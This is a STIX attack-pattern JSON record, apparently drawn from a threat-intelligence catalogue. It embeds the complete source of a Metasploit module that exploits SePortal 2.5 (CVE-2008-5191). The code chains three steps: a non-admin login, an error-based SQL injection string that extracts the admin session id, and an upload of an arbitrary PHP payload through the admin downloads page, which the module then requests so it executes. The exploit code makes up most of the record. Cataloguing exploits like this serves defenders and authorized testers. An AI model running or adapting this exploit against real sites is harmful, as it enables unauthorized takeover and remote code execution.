{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1442c943-84b2-4b31-a9b4-052f0d944279",
    "created": "2024-08-14T17:12:38.77026Z",
    "modified": "2024-08-14T17:12:38.770265Z",
    "name": "\"SePortal SQLi Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in SePortal version 2.5. When logging in as any non-admin user, it's possible to retrieve the admin session from the database through SQL injection. The SQL injection vulnerability exists in the \"staticpages.php\" page. This hash can be used to take over the admin user session. After logging in, the \"/admin/downloads.php\" page will be used to upload arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/seportal_sqli_exec.rb",
            "external_id": "seportal_sqli_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-5191"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"SePortal SQLi Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in SePortal version 2.5.\n        When logging in as any non-admin user, it's possible to retrieve the admin session\n        from the database through SQL injection. The SQL injection vulnerability exists\n        in the \"staticpages.php\" page. This hash can be used to take over the admin\n        user session. After logging in, the \"/admin/downloads.php\" page will be used\n        to upload arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'jsass', # Discovery\n          'xistence <xistence[at]0x90.nl>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2008-5191'],\n          ['OSVDB', '46567'],\n          ['EDB', '32359']\n        ],\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['SePortal', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-03-20',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to the SePortal installation', '/seportal']),\n          OptString.new('USER', [true, 'The non-admin user', 'test']),\n          OptString.new('PASS', [true, 'The non-admin password', 'test'])\n        ])\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    # Check version\n    vprint_status(\"Trying to detect installed version\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"index.php\")\n    })\n\n    if res and res.code == 200 and res.body =~ /Powered by \\<b\\>SePortal\\<\\/b\\> (.*)/\n      version = $1\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n    vprint_status(\"Version #{version} detected\")\n\n    if version.to_f <= 2.5\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n\n    print_status(\"Logging in as user [ #{datastore['USER']} ]\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"login.php\"),\n      'vars_post' => {\n          \"user_name\" => datastore['USER'],\n          \"user_password\" => datastore['PASS']\n      }\n    })\n\n    if res && res.code == 302 and res.get_cookies =~ /sessionid=([a-zA-Z0-9]+)/\n      session = $1\n      print_good(\"Login Successful\")\n      print_status(\"Session cookie is [ #{session} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Login was not succesful!\")\n    end\n\n    # Generate random string and convert to hex\n    sqlq = rand_text_alpha(8)\n    sqls = sqlq.each_byte.map { |b| b.to_s(16) }.join\n\n    # Our SQL Error-Based Injection string - The string will return the admin session between the words ABCD<hash>ABCD in the response page.\n    sqli = \"1' AND (SELECT #{sqls} FROM(SELECT COUNT(*),CONCAT(0x#{sqls},(SELECT MID((IFNULL(CAST(session_id AS CHAR),0x20)),1,50) \"\n    sqli << \"FROM seportal_sessions WHERE session_user_id=1 LIMIT 1\"\n    sqli << \"),0x#{sqls},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '0x#{sqls}'='0x#{sqls}\"\n\n    print_status(\"Retrieving admin session through SQLi\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'vars_get'   => { \"sp_id\" => sqli },\n      'cookie' => \"sessionid=#{session}\",\n      'uri'    => normalize_uri(uri, \"staticpages.php\")\n    })\n\n    if res and res.code == 200 and res.body =~ /#{sqlq}([a-zA-Z0-9]+)#{sqlq}/\n      adminhash = $1\n      print_status(\"Admin session is [ #{adminhash} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Retrieving admin session failed!\")\n    end\n\n    # Random filename\n    payload_name = rand_text_alpha_lower(rand(10) + 5) + '.php'\n    # Random title\n    rand_title = rand_text_alpha_lower(rand(10) + 5)\n    # Random category ID\n    rand_catid = rand_text_numeric(4)\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"savefile\", nil, nil, \"form-data; name=\\\"action\\\"\")\n    post_data.add_part(payload.encoded, \"application/octet-stream\", nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{payload_name}\\\"\")\n    post_data.add_part(rand_title, nil, nil, \"form-data; name=\\\"file_title\\\"\")\n    post_data.add_part(rand_catid, nil, nil, \"form-data; name=\\\"cat_id\\\"\")\n\n    file = post_data.to_s\n    file.strip!\n\n    print_status(\"Uploading payload [ #{payload_name} ]\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"admin\", \"downloads.php\"),\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie' => \"sessionid=#{adminhash}\",\n      'data'   => file\n    })\n\n    # If the server returns 200 and the body contains our payload name,\n    # we assume we uploaded the malicious file successfully\n    if not res or res.code != 200\n      fail_with(Failure::Unknown, \"#{peer} - File wasn't uploaded, aborting!\")\n    end\n\n    register_file_for_cleanup(payload_name)\n\n    print_status(\"Requesting payload [ #{uri}/data/down_media/#{payload_name} ]\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"data\", \"down_media\", \"#{payload_name}\")\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.\n    if res and res.code != 200\n      print_error(\"Unexpected response, exploit probably failed!\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-20",
    "x_mitre_platforms": [
        "['php']"
    ]
}